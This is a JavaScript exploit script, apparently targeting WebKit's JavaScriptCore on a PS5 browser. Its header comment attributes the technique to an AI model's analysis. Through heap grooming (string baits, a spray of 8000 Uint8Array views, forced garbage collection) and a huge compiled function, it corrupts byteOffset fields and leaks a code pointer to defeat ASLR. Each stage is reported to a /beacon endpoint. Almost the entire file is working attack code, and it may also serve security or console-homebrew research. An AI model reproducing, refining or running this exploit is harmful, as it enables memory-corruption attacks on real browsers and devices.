// p475 — byteOffset ASLR leak via MetadataTable sweep
//
// DeepSeek V4.1 analysis: the sweep writes thunk at entry+24 (≡0 mod 16).
// JSArrayBufferView::m_byteOffset at cell+32 (≡0 mod 16) can receive it.
// The getter jsNumber(thisObject->byteOffset()) has NO validation.
// Reading .byteOffset on a hit cell returns the full 8-byte thunk pointer.
//
// Cell size = 48B, entry stride = 112B, LCM cycle = 336B.
// 1 in 7 cells at the right mod-112 alignment gets the thunk.
// Spray 8000 views → expect ~1100 hits, all same address.
//
// WARNING: hit cells have zeroed JSCell headers (previous entry's ValueProfile = 0).
// On PS5, StructureID 0 decodes to heap_base + 0 → may still be readable.
// Use try/catch for safety.
//
// Beacon prefix: V475-
(function() {
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V475-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body || '');
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // ═════════════════════════════════════════════
  // PHASE 1: Bait strings — create ~100KB holes in marge
  // Use 'B'.repeat(100000) for FLAT StringImpl
  // ═════════════════════════════════════════════
  var BAIT_COUNT = 30;
  var baits = new Array(BAIT_COUNT);
  for (var i = 0; i < BAIT_COUNT; i++) {
    baits[i] = 'B'.repeat(100000);
    baits[i].charCodeAt(0); // force resolve
  }
  B('BAITS', '' + BAIT_COUNT);

  // ═════════════════════════════════════════════
  // PHASE 2: Spray TypedArray views (48B cells in MarkedSpace)
  // These are at HIGHER addresses (allocated after baits)
  // ═════════════════════════════════════════════
  var N_VIEWS = 8000;
  var views = new Array(N_VIEWS);
  for (var i = 0; i < N_VIEWS; i++) {
    var ab = new ArrayBuffer(64);
    views[i] = new Uint8Array(ab);
    views[i][0] = i & 0xFF;  // tag for identification
  }
  B('VIEWS', '' + N_VIEWS);

  // Verify initial byteOffset = 0 for all
  var initBad = 0;
  for (var i = 0; i < N_VIEWS; i++) {
    try {
      if (views[i].byteOffset !== 0) initBad++;
    } catch(e) { initBad++; }
  }
  B('INIT-CHECK', initBad > 0 ? 'BAD-' + initBad : 'OK');

  // ═════════════════════════════════════════════
  // PHASE 3: Free baits + GC → holes at low addresses
  // ═════════════════════════════════════════════
  for (var i = 0; i < BAIT_COUNT; i++) baits[i] = null;
  baits = null;
  for (var g = 0; g < 30; g++) {
    var junk = [];
    for (var j = 0; j < 1000; j++) junk.push(new ArrayBuffer(8192));
    for (var j = 0; j < 500; j++) junk.push(new Array(50).fill(g));
    junk = null;
  }
  B('GC-FREED');

  // ═════════════════════════════════════════════
  // PHASE 4: Compile 38M function (NO call!)
  // Metadata fills bait hole → sweep writes into MarkedSpace
  // ═════════════════════════════════════════════
  var N = 38348816;
  var CHUNK = 4000000;
  var nC = Math.floor(N / CHUNK);
  var rem = N - nC * CHUNK;
  var rep = 'a();'.repeat(CHUNK);
  var parts = new Array(nC + 3);
  parts[0] = 'window.__p475fn=function(a){';
  for (var c = 0; c < nC; c++) parts[1 + c] = rep;
  parts[nC + 1] = 'a();'.repeat(rem);
  parts[nC + 2] = '};window.__p475ok=1;';
  rep = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  B('BLOB', Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { B('SCRIPT-ERR'); };
  sc.onload = function() {
    B('COMPILED', window.__p475ok ? 'OK' : 'FAIL');
    doScan();
  };
  document.head.appendChild(sc);
  sc.src = url;

  function doScan() {
    // ═════════════════════════════════════════════
    // PHASE 5: Scan byteOffset on all views
    // Any non-zero = full 8-byte thunk address
    // ═════════════════════════════════════════════
    var hits = 0;
    var errors = 0;
    var firstHitIdx = -1;
    var firstHitVal = 0;
    var hitValues = [];

    for (var i = 0; i < N_VIEWS; i++) {
      try {
        var off = views[i].byteOffset;
        if (off !== 0) {
          hits++;
          if (firstHitIdx < 0) {
            firstHitIdx = i;
            firstHitVal = off;
          }
          if (hitValues.length < 10) {
            hitValues.push(i + ':' + off);
          }
        }
      } catch(e) {
        errors++;
        if (errors <= 3) {
          B('ERR-' + i, e.message ? e.message.substring(0, 40) : 'unknown');
        }
      }
    }

    B('SCAN', 'hits=' + hits + ',errors=' + errors + ',total=' + N_VIEWS);

    if (hits > 0) {
      B('FIRST-HIT', 'idx=' + firstHitIdx + ',val=' + firstHitVal);

      // Try to get hex representation
      try {
        var big = BigInt(firstHitVal);
        B('THUNK-HEX', '0x' + big.toString(16));
      } catch(e) {
        B('THUNK-DEC', '' + firstHitVal);
      }

      // Report multiple hits for consistency check
      B('HITS', hitValues.join('|'));

      // Check if all hits report the same value
      var consistent = true;
      for (var i = 0; i < N_VIEWS && consistent; i++) {
        try {
          var off = views[i].byteOffset;
          if (off !== 0 && off !== firstHitVal) consistent = false;
        } catch(e) {}
      }
      B('CONSISTENT', consistent ? 'YES-all-same' : 'NO-varying');

      // Also try .length corruption (32-bit at cell+24)
      var lenHits = 0;
      for (var i = 0; i < N_VIEWS; i++) {
        try {
          if (views[i].length !== 64) {
            lenHits++;
            if (lenHits <= 3) {
              B('LEN-' + i, '' + views[i].length);
            }
          }
        } catch(e) {}
      }
      B('LEN-HITS', '' + lenHits);

    } else if (errors > 0) {
      B('CRASH-ONLY', errors + ' errors, 0 readable hits');
    } else {
      B('NO-HIT', 'byteOffset=0 on all ' + N_VIEWS + ' views');
    }

    B('DONE');
  }
})();
